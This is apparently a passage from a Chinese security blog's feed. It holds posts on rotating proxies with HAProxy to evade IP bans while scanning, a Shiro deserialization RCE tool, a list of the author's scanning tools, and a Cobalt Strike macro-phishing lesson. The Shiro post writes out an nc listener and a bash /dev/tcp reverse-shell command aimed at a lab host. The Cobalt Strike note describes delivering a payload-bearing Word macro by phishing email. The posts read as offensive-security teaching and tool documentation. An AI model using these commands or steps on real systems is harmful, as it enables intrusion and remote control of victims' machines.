        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在平时进行一些挖洞、扫描或者爬虫工作的时候，被封 IP 的情况时有发生，解决这个问题较好的方法可能就是挂代理了。但是代理有时也会被封，并且有的代理质量可能还不太高，这时采用负载均衡个人觉着是一种不错的解决方法。</p><p>在开启负载均衡时，系统能够自动切换到较为优质的代理线路上；同时由于系统经常自动切换 IP ，因此个人觉着也能在一定程度上减轻被封 IP 的风险。</p><a id="more"></a><p>在 Windows 上，平时个人使用的代理工具自带就有负载均衡选项，但是无奈 Linux 下个人暂时还没能找到合适的工具，后来在网上查资料得知可以通过 Nginx 或 HAProxy 去配置负载均衡，虽然这样没有 Windows 下那样方便，但好在能解决这个问题。</p><p>通过 Nginx 或 HAProxy 的对比，HAProxy 有 Web 可视化页面，因此个人觉着会更直观些，当然这个因人而异。</p><p>在折腾了一天的时间后，终于在 Linux 下利用 HAProxy 配置好了负载均衡，下面就简单记录一下配置过程以及中间踩得一些坑。</p><h1 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h1><h2 id="一些设备"><a href="#一些设备" class="headerlink" title="一些设备"></a>一些设备</h2><ul><li>一台 Linux 主机，用来做负载均衡服务器，这里以 Ubuntu 为例，其他 Linux 发行版基本上就一个安装命令与之不同。</li><li>一些可用的代理，这里以酸酸乳为例。</li></ul><h2 id="一些条件"><a href="#一些条件" class="headerlink" title="一些条件"></a>一些条件</h2><p>所有代理的密码、加密方式、协议、混淆方式都必须一致，简而言之，除了代理的IP之外的信息都尽可能的保持一致。</p><p>达到以上条件后，就可以在 Linux 下利用 HAProxy 配置负载均衡了。</p><h1 id="0x02-HAProxy-的安装与使用"><a href="#0x02-HAProxy-的安装与使用" class="headerlink" title="0x02 HAProxy 的安装与使用"></a>0x02 HAProxy 的安装与使用</h1><p>HAProxy 可直接使用<code>apt install</code>进行安装，安装之前建议先将系统<code>apt-get update</code>一下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> haproxy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装之后，编辑配置文件，编辑之前建议先将配置文件进行备份。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /etc/haproxy/haproxy.cfg /etc/haproxy/haproxy.cfg.bak<span class="token function">vim</span> /etc/haproxy/haproxy.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>为了便于直接复制配置文件信息，这里使用的<code>mv</code>命令进行备份，因此使用<code>vim</code>打开时，直接将以下配置文件信息根据自己情况修改复制到<code>/etc/haproxy/haproxy.cfg</code>即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">global    <span class="token function">chroot</span>  /var/lib/haproxy    pidfile /var/run/haproxy.pid    user    haproxy    group   haproxydefaults    mode    tcp                         <span class="token comment">#服务器默认的工作模式</span>    balance roundrobin                  <span class="token comment">#服务器默认使用的均衡模式</span>    retries <span class="token number">3</span>                           <span class="token comment">#三次连接失败表示服务器不可用</span>    maxconn <span class="token number">5000</span>                        <span class="token comment">#最大连接数</span>    <span class="token function">timeout</span> connect 500ms               <span class="token comment">#连接超时</span>    <span class="token function">timeout</span> client  3s                  <span class="token comment">#客户端超时</span>    <span class="token function">timeout</span> server  3s                  <span class="token comment">#服务器超时</span>listen WebPanel    mode    http                        <span class="token comment">#这里使用HTTP模式</span>    <span class="token builtin class-name">bind</span>    <span class="token number">127.0</span>.0.1:50000             <span class="token comment">#WEB服务端口</span>    stats   refresh 5s                  <span class="token comment">#自动刷新时间</span>    stats   uri  /                      <span class="token comment">#WEB管理地址</span>    stats   auth admin:admin   <span class="token comment">#账号密码</span>    stats   hide-version                <span class="token comment">#隐藏版本</span>    stats   admin <span class="token keyword">if</span> TRUE               <span class="token comment">#验证通过则赋予管理权</span>listen Server    <span class="token builtin class-name">bind</span> <span class="token number">127.0</span>.0.1:8880    <span class="token comment">#服务IP端口</span>    server proxy_name1 proxy_ip1:proxy_port1 check inter <span class="token number">500</span> rise <span class="token number">2</span> fall <span class="token number">4</span> weight <span class="token number">100</span><span class="token comment">#酸酸乳服务器地址与端口</span>    server proxy_name2 proxy_ip2:proxy_port2 check inter <span class="token number">500</span> rise <span class="token number">2</span> fall <span class="token number">4</span> weight <span class="token number">100</span><span class="token comment">#酸酸乳服务器地址与端口</span>    server proxy_name3 proxy_ip3:proxy_port3 check inter <span class="token number">500</span> rise <span class="token number">2</span> fall <span class="token number">4</span> weight <span class="token number">100</span><span class="token comment">#酸酸乳服务器地址与端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的配置文件中，修改最后几行代理信息即可，即将其中的<code>proxy_name、proxy_ip、proxy_port</code>替换成自己的就行。</p><h2 id="关于配置文件中的一些注意事项"><a href="#关于配置文件中的一些注意事项" class="headerlink" title="关于配置文件中的一些注意事项"></a>关于配置文件中的一些注意事项</h2><ul><li>配置文件中的注释信息需要删除，尤其是中文，否则 HAProxy 启动时会报错</li><li>HAProxy 启动时如果报错，建议检查配置文件中是否存在格式错误、缺字多字的情况，这都会导致报错</li><li>如果 HAProxy 在公网服务器上建议将 Web 管理地址与登录的账号密码设置为较难猜解的信息</li><li>如果想了解配置文件中的更多信息可以查看参考链接中的文章</li></ul><p>HAProxy 配置完后，直接使用<code>service</code>命令启动即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> haproxy start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，浏览器打开 HAProxy 的 Web 管理地址，输入账号密码后，看到以下页面，就说明 HAProxy 已经正在运行了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-05_00-19-41.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在这个 Web 页面中，绿色的线路表示当前可用，红色线路表示当前可能是不可用状态，其他颜色所表示的意思可参考页面上方的示意信息。</p><h1 id="0x03-代理客户端上的配置"><a href="#0x03-代理客户端上的配置" class="headerlink" title="0x03 代理客户端上的配置"></a>0x03 代理客户端上的配置</h1><p>配置好 HAProxy，就开始配置代理工具了。根据上面 HAProxy 配置文件，服务 IP 端口配置的为<code>127.0.0.1:8880</code>。</p><p>打开酸酸乳的配置文件，我这里是<code>user-config.json</code>文件，原文件内容如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>    <span class="token string">"server"</span><span class="token builtin class-name">:</span><span class="token string">"xxxxxx"</span>,    <span class="token string">"server_port"</span>:xxxx,    <span class="token string">"local_address"</span><span class="token builtin class-name">:</span><span class="token string">"127.0.0.1"</span>,    <span class="token string">"local_port"</span>:1080,    <span class="token string">"password"</span><span class="token builtin class-name">:</span><span class="token string">"xxxx"</span>,    <span class="token string">"timeout"</span>:600,    <span class="token string">"method"</span><span class="token builtin class-name">:</span><span class="token string">"xxxx"</span>,    <span class="token string">"protocol"</span><span class="token builtin class-name">:</span> <span class="token string">"xxxx"</span>,    <span class="token string">"obfs"</span><span class="token builtin class-name">:</span> <span class="token string">"xxxx"</span>,    <span class="token string">"obfs_param"</span><span class="token builtin class-name">:</span> <span class="token string">"xxxx"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在需要把文件中的<code>server</code>和<code>server_port</code>修改为 HAProxy 的服务 IP 端口信息，即 <code>127.0.0.1:8880</code>，修改后如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>    <span class="token string">"server"</span><span class="token builtin class-name">:</span><span class="token string">"127.0.0.1"</span>,    <span class="token string">"server_port"</span>:8880,    <span class="token string">"local_address"</span><span class="token builtin class-name">:</span><span class="token string">"127.0.0.1"</span>,    <span class="token string">"local_port"</span>:1080,    <span class="token string">"password"</span><span class="token builtin class-name">:</span><span class="token string">"xxxx"</span>,    <span class="token string">"timeout"</span>:600,    <span class="token string">"method"</span><span class="token builtin class-name">:</span><span class="token string">"xxxx"</span>,    <span class="token string">"protocol"</span><span class="token builtin class-name">:</span> <span class="token string">"xxxx"</span>,    <span class="token string">"obfs"</span><span class="token builtin class-name">:</span> <span class="token string">"xxxx"</span>,    <span class="token string">"obfs_param"</span><span class="token builtin class-name">:</span> <span class="token string">"xxxx"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来，重启酸酸乳，使用 curl 进行一下测试。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> --socks5-hostname <span class="token number">127.0</span>.0.1:1080 cip.cc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># curl --socks5-hostname 127.0.0.1:1080 cip.cc</span>IP      <span class="token builtin class-name">:</span> <span class="token number">200</span>.xxx.xxx.41……省略……root@ubuntu:~<span class="token comment"># curl --socks5-hostname 127.0.0.1:1080 cip.cc</span>IP      <span class="token builtin class-name">:</span> <span class="token number">200</span>.xxx.xxx.48……省略……root@ubuntu:~<span class="token comment"># curl --socks5-hostname 127.0.0.1:1080 cip.cc</span>IP      <span class="token builtin class-name">:</span> <span class="token number">200</span>.xxx.xxx.42……省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过测试，可以发现每次请求时，自己的 IP 都会改变，这就是 HAProxy 起到了作用。</p><p>这里只是进行一下测试，平时在<code>Linux</code>下使用代理的时候，更推荐使用<code>proxychains4</code>对命令进行代理。</p><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ul><li>在修改代理客户端的代理配置文件之前，一定要确保当前配置文件是没问题的，以便于后期排错。</li><li>只有代理客户端的配置文件是配置的 HAProxy 服务IP端口信息，其他比如浏览器、curl 等都是和原来一样代理到代理工具的 IP、端口上即可，这个是我陷的比较深的一个坑。</li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在平时不管挖洞还是扫描、爬虫，个人觉着开启负载均衡之后，在一定程度上应该是能降低被封 IP 的风险的，同时代理质量也能上去。</p><p>但是在涉及账号登录情况下，就建议不要开启负载均衡了，不然有的系统监测到异地登录就会把账号退出了，手动登录之后，发现系统又检测到了异地登录，然后又给账号退出了……</p><p>总的来说，以上就是我个人的一些小总结以及踩过的一些坑，希望大家碰到同类问题时，这篇文章能够对其有所帮助。</p><blockquote><p>参考链接：</p><p><a href="https://44i.im/index.php/2020/02/10/ss-ssr-v2ray-balance/">https://44i.im/index.php/2020/02/10/ss-ssr-v2ray-balance/</a></p><p><a href="https://tianws.github.io/skill/2019/07/11/gfw/">https://tianws.github.io/skill/2019/07/11/gfw/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> 代理 </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】shiro漏洞检测RCE工具</title>
      <link href="//200619-233603.html"/>
      <url>//200619-233603.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在做shiro反序列化漏洞复现，从网上也找了一堆复现文章和工具，但是这些工具用着都不太舒服，于是参考网上大佬们的工具，自己进行了一些简单的改良。</p><a id="more"></a><h1 id="0x01-工具安装"><a href="#0x01-工具安装" class="headerlink" title="0x01 工具安装"></a>0x01 工具安装</h1><p>本工具需要 Python3 和 Java 环境，下载本工具后，将文件解压，在本项目目录下运行下面的命令，安装Python第三方库即可。</p><pre class="line-numbers language-none"><code class="language-none">pip3 install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>国外下载地址：<a href="https://github.com/teamssix/shiro-check-rce/releases/">https://github.com/teamssix/shiro-check-rce/releases/</a></p><p>国内下载地址：<a href="https://gitee.com/teamssix/shiro-check-rce/releases">https://gitee.com/teamssix/shiro-check-rce/releases</a></p><h1 id="0x02-工具介绍"><a href="#0x02-工具介绍" class="headerlink" title="0x02 工具介绍"></a>0x02 工具介绍</h1><pre class="line-numbers language-none"><code class="language-none">   _____ __    _               ________              __      ____  ____________  &#x2F; ___&#x2F;&#x2F; &#x2F;_  (_)________     &#x2F; ____&#x2F; &#x2F;_  ___  _____&#x2F; &#x2F;__   &#x2F; __ \&#x2F; ____&#x2F; ____&#x2F;  \__ \&#x2F; __ \&#x2F; &#x2F; ___&#x2F; __ \   &#x2F; &#x2F;   &#x2F; __ \&#x2F; _ \&#x2F; ___&#x2F; &#x2F;&#x2F;_&#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;   &#x2F; __&#x2F;    ___&#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F;  &#x2F; &#x2F;___&#x2F; &#x2F; &#x2F; &#x2F;  __&#x2F; &#x2F;__&#x2F; ,&lt;    &#x2F; _, _&#x2F; &#x2F;___&#x2F; &#x2F;___   &#x2F;____&#x2F;_&#x2F; &#x2F;_&#x2F;_&#x2F;_&#x2F;   \____&#x2F;   \____&#x2F;_&#x2F; &#x2F;_&#x2F;\___&#x2F;\___&#x2F;_&#x2F;|_|  &#x2F;_&#x2F; |_|\____&#x2F;_____&#x2F;   By TeamsSix我的个人博客：teamssix.com我的个人公众号：TeamsSix-c ：输入要执行的命令-h ：查看帮助-k : 输入自定义的key，不输入此参数时将遍历尝试默认key-t ：输入你的ceye.io的token，用于检测shiro漏洞是否存在，此选项需要配合 -c &quot;ping your.ceye.io&quot; 使用-u ：指定URLpython3 shiro-check-rce.py (-c) &lt;command&gt; [-h] [-k] &lt;key&gt; [-t] &lt;token&gt; (-u) &lt;url&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>该功能需要你有一个<a href="http://ceye.io/">http://ceye.io/</a>的账号，在<a href="http://ceye.io/profile">http://ceye.io/profile</a>页面，找到自己的<code>Identifier</code>值和<code>API Token</code>值。</p><p>使用 -t 和 -c 参数配合使用，即可调用默认key字典进行检测。</p><blockquote><p>文中的 <a href="http://192.168.175.146:8080/">http://192.168.175.146:8080/</a> 为本地靶机，192.168.175.152:9527 为 nc 监听地址。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125;示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-21-10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果你有自己的key，也可以使用 -k 参数进行指定。</p><pre class="line-numbers language-none"><code class="language-none">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125; -k &#123;key&#125;示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6 -k kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-27-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、反弹shell"><a href="#2、反弹shell" class="headerlink" title="2、反弹shell"></a>2、反弹shell</h2><p>这里我采用bash命令反弹到本地nc监听端口的方式，因此我这里需要先在本地建立一个 nc 监听端口。</p><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，执行反弹shell命令</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#123;your_nc_ip&#125;&#x2F;&#123;your_nc_port&#125; 0&gt;&amp;1示例：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.175.152&#x2F;9527 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>本工具会对输入命令进行识别，如果检测到用户输入了bash反弹shell命令，将会自动对命令进行编码，无需自己编码，避免了明明存在漏洞却因为编码问题而反弹不了shell的尴尬。</p><pre class="line-numbers language-none"><code class="language-none">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#123;your_nc_ip&#125;&#x2F;&#123;your_nc_port&#125; 0&gt;&amp;1&quot;示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.175.152&#x2F;9527 0&gt;&amp;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果知道key的话，就直接 -k 指定 key 即可</p><pre class="line-numbers language-none"><code class="language-none">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#123;your_nc_ip&#125;&#x2F;&#123;your_nc_port&#125; 0&gt;&amp;1&quot; -k &#123;key&#125;示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.175.152&#x2F;9527 0&gt;&amp;1&quot; -k kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell_key.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul><li>本程序需要 python3 环境以及 java环境</li><li>在进行漏洞检测时，-c 指定 ping 的 URL 和 -t 指定的 token 需要是同一 ceye 账户的。</li><li>在安装<code>pycryptodome</code>库时，可能会碰到一些问题，可以根据报错信息进行排查，或者到网上找寻相关资料</li></ul><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>GitHub项目地址：<a href="https://github.com/teamssix/shiro-check-rce/">https://github.com/teamssix/shiro-check-rce/</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
            <tag> shiro </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】分享几个平时经常用到的小工具</title>
      <link href="//200613-134525.html"/>
      <url>//200613-134525.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平时自己偶然会根据需要写点小工具，但是一直没上传到我的Github上（其实是因为太懒），今天把一些自己平时使用比较频繁的一些小工具上传到我的Github上，有问题的可以反馈，有喜欢的可以给个Star，嘿嘿。</p><a id="more"></a><h1 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h1><h2 id="dirsearch-single"><a href="#dirsearch-single" class="headerlink" title="dirsearch-single"></a>dirsearch-single</h2><p>地址：<a href="https://github.com/teamssix/dirsearch-single">https://github.com/teamssix/dirsearch-single</a></p><p>介绍：在平时会碰到一个目标的多个资产都是使用的同一个CMS，当发现了一个站点的漏洞时，可能其他站点也存在此漏洞，此时就可以对这些URL进行单个目录的批量检测了。</p><h2 id="fckeditor-dircheck"><a href="#fckeditor-dircheck" class="headerlink" title="fckeditor-dircheck"></a>fckeditor-dircheck</h2><p>地址：<a href="https://github.com/teamssix/fckeditor-dircheck">https://github.com/teamssix/fckeditor-dircheck</a></p><p>介绍：此工具主要对fckeditor编辑器的上传路径进行检测，目录字典为<code>dir_fckeditor.txt</code>，各位大佬也可以根据自己需求、经验进行字典的添加。</p><h2 id="http-sys-check"><a href="#http-sys-check" class="headerlink" title="http.sys-check"></a>http.sys-check</h2><p>地址：<a href="https://github.com/teamssix/http.sys-check">https://github.com/teamssix/http.sys-check</a></p><p>介绍：由于在网上没有找到合适的批量检测http.sys漏洞的工具，于是自己简单写了一个，在这里分享出来。</p><h2 id="springboot-check"><a href="#springboot-check" class="headerlink" title="springboot-check"></a>springboot-check</h2><p>地址：<a href="https://github.com/teamssix/springboot-check">https://github.com/teamssix/springboot-check</a></p><p>介绍：由于在网上没有找到满意的springboot敏感目录检测的工具，于是就自己简单写了一个，dir_springboot.txt为检测的字典，都是从网上收集来的，各位大佬也可以自己根据自己需要进行添加。</p><h2 id="url-survival-check"><a href="#url-survival-check" class="headerlink" title="url-survival-check"></a>url-survival-check</h2><p>地址：<a href="https://github.com/teamssix/url-survival-check">https://github.com/teamssix/url-survival-check</a></p><p>介绍：由于平时在做资产梳理的时候，往往会遇到对大量URL进行存活检测的工作，有时候有的URL使用http能打开，有的则使用https才能打开，手动去检测效率太低，因此简单写了一个批量检测工具。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>上面这些工具由于主要是平时自己使用，因此写的比较粗糙。各位大佬在使用过程中，如果碰到Bug，可以在Github上进行反馈。</p><p>除了上述工具外，还有一些工具因为存在的Bug比较多、误报率较高而没有上传到我的Github上，后期等成熟的时候，会一一上传上去。</p><p>如果上面的工具有帮助到你，欢迎给个star或Github的关注，最后祝各位大佬HW顺利。</p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】28、白名单申请和宏渗透</title>
      <link href="//200419-150740.html"/>
      <url>//200419-150740.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是 Cobalt Strike 学习笔记的最后一节，这节将来学习白名单申请与宏渗透的一些方法。</p><h1 id="0x01-白名单申请"><a href="#0x01-白名单申请" class="headerlink" title="0x01 白名单申请"></a>0x01 白名单申请</h1><p>Win + R 打开运行窗口，输入 <code>gpedit.msc</code> ，来到 <code>用户配置 -&gt; 管理模板 -&gt; 系统</code> 处，打开 <code>只允许指定的 Windows 程序</code></p><p>在打开的窗口中，勾选<code>已启用</code>，之后点击<code>显示</code>按钮，在其中写入白名单的程序名称后，点击两次确定之后即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-建立宏攻击"><a href="#0x02-建立宏攻击" class="headerlink" title="0x02 建立宏攻击"></a>0x02 建立宏攻击</h1><p>在 Cobalt Strike 客户端上，选择 <code>Packages --&gt; MS Office Macro</code>，指定一个监听器，点击 <code>Generate</code>，之后根据提示的步骤生成一个 Word 文档。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>大体的步骤如下：</p><p>1、打开 Microsoft Word 或者 Excel</p><p>2、来到 <code>视图 --&gt; 宏</code></p><p>3、任意填写一个宏的名称</p><p>4、宏的位置选择为当前文档</p><p>5、点击创建</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>6、在打开的编辑器中，删除掉原来的内容</p><p>7、点击 Cobalt Strike 上的 <code>Copy Macro</code> 按钮</p><p>8、将刚复制 Cobalt Strike 生成的内容粘贴到打开的编辑器中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>9、关闭编辑器</p><p>10、将文档保存为启用宏的文档，这里可以选择保存为 <code>启用宏的 Word 文档</code> 或者 <code>Word 97-2003 文档</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来使用钓鱼邮件等方式上传到靶机，当靶机运行该文档后启用宏内容即可上线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>这里不得不吐槽一句，Microsoft Office 的东西安装是真的麻烦。</p></blockquote><p>在上面 2-8 步骤创建编辑宏内容的过程，也可以打开 <code>开发工具 --&gt; Visual Basic</code> 界面，这里推荐使用快捷键<code>Alt+F11</code>打开该界面。</p><p>之后编辑<code>ThisDocument</code> 模块，粘贴宏代码也可以达到上述 2-8 步的效果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>自 4 月 19 日发布 Cobalt Strike 第一节笔记开始，已经过去了半年的时间，踩过了无数坑，解决了无数的坑。</p><p>感谢 Cobalt Strike 的作者 <code>Raphael Mudge</code> 的课程，感谢 UP <code>Hack 学习呀</code> 上传的中文翻译版本，感谢 <code>A-Team</code> 团队的 Cobalt Strike 4.0 